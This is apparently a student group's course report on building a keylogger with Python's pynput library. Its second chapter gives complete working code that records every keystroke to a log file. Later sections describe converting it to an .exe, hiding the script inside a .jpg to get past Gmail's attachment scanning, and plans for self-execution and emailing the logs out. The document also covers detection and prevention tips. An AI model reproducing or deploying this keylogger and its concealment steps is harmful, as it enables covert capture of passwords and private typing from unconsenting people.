# KeyloggerApp





YOUTHRIVE

Powered by Access Bank and the FGN
Facilitated by CareerEx

The Final Class Project 2

Group name: Cybersecurity Protect

Implementation of a Simple Keylogger Using the Pynput Library

















Chapter One
Introduction to keyloggers
Imagine if someone had access to everything you type, while it can sometimes be done legally, keylogging is a form of data monitoring used to surreptitiously acquire people’s personal information. 

A keylogger or keystroke logger/keyboard capturing is a form of malware or hardware that keeps track of and records your keystrokes as you type. It takes the information and sends it to a hacker using a command-and-control (C&C) server. The hacker then analyzes the keystrokes to locate usernames and passwords and uses them to hack into otherwise secure systems.

A keylogger (or keystroke logger) is a type of spyware that monitors and records what you type on your computer or mobile phone. Keylogging software or hardware can be used to monitor activity for legal or illegal purposes.

What are Keyloggers?

Keyloggers are a type of surveillance software or hardware device that records the keystrokes on a computer. They can capture everything a user types, including usernames, passwords, emails, and other sensitive information. Keyloggers can be used for various purposes, both legitimate and malicious:

1.	Legitimate Uses:
o	Employee Monitoring: Employers may use keyloggers to monitor employee activity for productivity or security purposes.
o	Parental Control: Parents might use keyloggers to keep track of their children's online activities.
o	Personal Use: Individuals might use keyloggers to track their own computer usage or to recover lost typing if a document is accidentally closed without saving.
2.	Malicious Uses:
o	Cyber Espionage: Hackers use keyloggers to steal sensitive information such as login credentials, credit card details, and other personal data.
o	Identity Theft: Collected data can be used to impersonate individuals and commit fraud.
o	Corporate Espionage: Competitors might use keyloggers to gain access to proprietary information.

Types of Keyloggers:

•	Software Keyloggers: These are programs installed on a computer that run in the background and log keystrokes. They can be hidden from the user and difficult to detect.
•	Hardware Keyloggers: These are physical devices attached to the computer, often between the keyboard and the computer itself, that intercept and log keystrokes.



How are Keyloggers Constructed?
The primary concept behind keyloggers is they must be placed between when a key gets depressed on a keyboard and when the information regarding that keystroke appears on the monitor. There are several ways to accomplish this.

Some hackers use video surveillance to see the connection between the pressed keys and what appears on the monitor. A video camera with a view of the keyboard and the screen can be set up. Once it records a video of the keystrokes and the login or authentication screens the strokes have to get past, the hacker can play the video back, slow it down, and see which keys were pressed.

An attacker can also put a hardware bug inside the keyboard itself. This would record each stroke made and send the information to be stored, either on a server or nearby physical device. It is possible for a keylogger to be placed within the wiring or inside the computer—as long as it is between the keyboard and the monitor.

Additionally, keylogger software can be designed to intercept all input that comes from the keyboard. This can be done using a few different methods:
●	The driver that facilitates the interaction between the keyboard and the computer can be replaced with one that logs each keystroke.
●	A filter driver can be positioned within the keyboard stack.
●	Kernel functions, which use similarities between data to assist machine learning, can be intercepted by software keyloggers and then used to derive the necessary keystrokes to perform authentication functions.
●	The functions of the dynamic link library (DLL), which stores code used by more than one program, can be intercepted.
The software, which is recognized as a form of spyware, is built using a few different methods. Here are the most common:
	A system hook, which is a technique for altering the operating system's behavior, is used to intercept each notification generated whenever a key is pressed. This kind of software is typically built using the coding language C.
	A cyclical information request is set up that gathers information from the keyboard. These kinds of keyloggers are typically written using Visual Basic or Borland Delphi.
	A filter driver is written in C and installed inside the computer.
	As a sort of defense mechanism, some keyloggers, referred to as rootkits, have the ability to disguise themselves to slip manual or antivirus detection. They either mask in user mode or kernel mode.




Introduction to Pynput Library

The Pynput library is a Python package that allows you to control and monitor input devices such as the keyboard and mouse. It is commonly used for developing automation scripts, creating user interface testing tools, and even building keyloggers for educational and legitimate purposes.

Key Features of Pynput:
•	Cross-Platform: Pynput works on multiple operating systems, including Windows, macOS, and Linux.
•	Event Handling: It provides mechanisms to listen for keyboard and mouse events and execute specific functions in response.
•	Ease of Use: The library is designed to be simple and intuitive, making it accessible for both beginners and experienced programmers.

It contains subpackages for each type of input device supported:
pynput.mouse
Contains classes for controlling and monitoring a mouse or trackpad.
pynput.keyboard
Contains classes for controlling and monitoring the keyboard.
All modules mentioned above are automatically imported into the pynput package. To use any of them, import them from the main package:
from pynput import mouse, keyboard















Chapter Two

Implementation and Deployment of the keylogger using Pynput

The keystroke logger otherwise referred to as the Keylogger to be implemented is the software type for the purpose of this project.
A keylogger program’s basic functionality is to monitor keystrokes continuously and then deliver those keystrokes to a specific location that can be either an email, server, or stored locally in the system.

How To Create a Keylogger In Python
Step 1: To create our keylogger, we will use a Python library named pynput. This Python library lets you fully control and monitor keyboard and mouse inputs. The library supports mouse and keyboard input devices and has the following sub-packages:
•	pynput.mouse – This package includes all the classes to control and monitor a mouse or trackpad.
•	pynput.keyboard – This package contains all the classes to work with the keyboard.
Install the pynput library using the  pip install pynput command.
Step 2: Now that we have installed the required Python library, let’s import all the required packages and define the instance that will contain the strings

from pynput.keyboard import Listener
def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = ''
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"

Step 3: This step will specify the path to storing the log file. This log file will include all the monitored keystrokes in the format specified.
with open("keylog.txt", 'a') as f:
        f.write(letter)

Step 4: In this final step, we will create a Listener instance, define the on_press() method, and join it with the main program thread.
with Listener(on_press=write_to_file) as l:
    l.join()

After completing all these steps, the final program should look like this, and you can execute this script.
from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'", "")
    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift_r':
        letter = “”
    if letter == "Key.ctrl_l":
        letter = ""
    if letter == "Key.enter":
        letter = "\n"
    with open("keylog.txt", 'a') as f:
        f.write(letter)
# Collecting events until stopped
with Listener(on_press=write_to_file) as l:
    l.join()
Step 5: The final code will be saved as a python file with extension .py on the directory you wish to run the keylogger from as depicted below for example:
 
Figure 2.1
Step 6: Open a terminal and run the keylogger.py file with the command below:
    $ python3 keylogger.py
 
Figure 2.2
Step 7: With the file running, you can check the output of our keylogger program, type some random keys and open your log file already generated on the desktop.
 
Figure 2.3
 
Figure 2.4









Chapter Three

Testings and Modifications
The python file was successfully activated on the command prompt and the log file generated as expected.
The final output depicted in figure 2.4 is the readable log format after several code cleaning associated with some special keystroke the keyboard that also listened to by the program,
The simple text phrase depicted below in figure 3.1 that was typed with some special keys and the terminal cleared by pressing the backspace key would have been very difficult to make sense of it even with the keylogger running without the proper sanitization of the codes:
 
Figure 3.1
 
Figure 3.2















Modifications

The keylogger.py was successfully modified into a .exe file to ease the initiation of the program without manually running it from the terminal.
This is achieved as depicted below:

 
Figure 3.3
   
Figure 3.4






Encryption of the python file in a picture


 

Figure 3.6


The new file froggy.jpg opened with a text editor:

 

Figure 3.7
Chapter Four

Detection and Mitigations against Keyloggers

How to Detect a Keylogger?

The Windows operating system is the most commonly used operating system hence more focus will be placed on the detection of the keylogger activities in a windows based OS.

The simplest way to detect a keylogger is to check your task manager. Here, you can see which processes are running. It can be tough to know which ones are legitimate and which could be caused by keyloggers, but you can differentiate the safe processes from the threats by looking at each process up on the internet. In some cases, you may find a warning written by another user regarding a process, or several processes, that indicate keylogger activity.  To access the task manager in Windows, right-click on the taskbar, and then choose "Task Manager" from the menu. In this window, each program under the Apps section are the ones in use by your computer, which will appear in windows on your screen. You will not see a keylogger in this section. However, you may be able to find one by looking through the Background processes section.

Another good place to look for keyloggers is under the Startup tab. Keyloggers get set up to run all the time on a computer, and to do that, they need to be started up with the operating system. As you peruse the Startup list, look for anything you cannot remember installing yourself. If something seems out of place, click on its line and then click on the Disable button on the lower-right side of the window.

You can also check for keyloggers by examining your computer’s internet usage report. To access this in Windows, press the Windows button and “I” at the same time. This will bring you to the settings screen. Here, you should choose "Network & Internet," then "Data usage." A list of the programs that your computer is using to access the internet will appear. If anything seems suspicious or you simply do not recognize it, do a search to investigate what it is. It may be a keylogger.

You can do the same form of investigation with browser extensions. If there are extensions you do not recall installing, disable them because they could be keyloggers. Here is how to access your extensions in some of the most common browsers: 

Safari: Choose "Preferences" in the Safari menu and click on "Extensions."
Chrome: Go to the address field and type "chrome://extensions."
Opera: Choose "Extensions," then select "Manage Extensions."
Firefox: Enter "about: addons" in the address field.
Microsoft Edge: Select "Extensions" in your browser menu.
Internet Explorer: Go to the Tools menu and choose "Manage add-ons."


Security and Ethical Considerations
When working with keyloggers, it's crucial to understand the ethical and legal implications. Unauthorized use of keyloggers is illegal and unethical. Always ensure that you have explicit permission to monitor someone's keystrokes. Use keyloggers responsibly and for legitimate purposes only, such as for personal use, educational purposes, or with consent in a controlled environment.

Here’s how you can help prevent keylogging attacks and reduce the risk of a malware infection:

	Install malware detection program.
	Enable two-factor authentication: Enabling two-factor authentication (2FA) is one of the most effective forms of virus, malware, and keylogger prevention. 2FA adds an extra log-in step such as a fingerprint or temporary PIN sent to your phone, which helps to authenticate your identity and make sure unauthorized people can't access your account. 
	Don’t download unknown files: Another important way to protect yourself from different types of malware is to avoid downloading unknown files or clicking on suspicious links. Phishing attacks are widely used scams that can lead to malware or keylogger infections. 
	Consider a virtual keyboard: This displays an interactive keyboard on your screen, so you don’t have to physically type on an analog one. Virtual keyboards circumvent keylogging hardware and any keylogging software specifically designed to record interactions with your physical keyboard. However, some software can still monitor your on-screen interactions, so it’s not a complete solution. 
	Use a password manager: A password manager isn’t just a convenient way to store passwords It’s also an effective tool against keylogging, because you don’t display your passwords or physically type them into your keyboard or keypad, meaning that keystroke monitors can’t capture them.
	 Consider voice-to-text conversion software: Like a virtual keyboard, voice-to-text conversion software can circumvent forms of keylogging that specifically target your physical keyboard. 
	Use antivirus software: Look for antivirus protection that includes anti-spyware and anti-keylogger protection. As with all forms of viruses, new, more sophisticated keystroke malware is being written all the time, so keep your software updated to stay more secure.









Chapter Five

Conclusion and Recommendations

The Implementation of the simple keylogger using the Pynput library was achieved with the Listener function available the library. The scripting require some basics python programing to achieve the keylogger.

We achieve some level of encryption to be able to transmit the .py file over the mail system by zip the file and also hiding it a .jpg file and both instances was successful without being flagged by the gmail server when we send it as attachment without encryption. 

The project can still be enhanced to become self-executing as duly achieved in our work or scheduled to run with the crontab in Linux systems.

The log file can be designed to be sent via email rather than being stored directly on the system on which the program is running.

The codding can be more robust to handle all the special characters, function keys etc to actually ensure full monitoring of all activities on the keyboard.

The pynput library can still be utilized to control the keyboard and mouse as well as log the mouse mouse movements.



























References

Spyware: What it is and how to protect yourself - Norton
macmyths.com

https://pynput.readthedocs.io/en/latest/

https://github.com/attreyabhatt/Python-Keylogger/blob/master/keylogger.py

https://mailtrap.io/blog/gmail-smtp/

https://www.datacamp.com/tutorial/two-simple-methods-to-convert-a-python-file-to-an-exe-file

https://www.online-tech-tips.com/hide-file-in-picture/


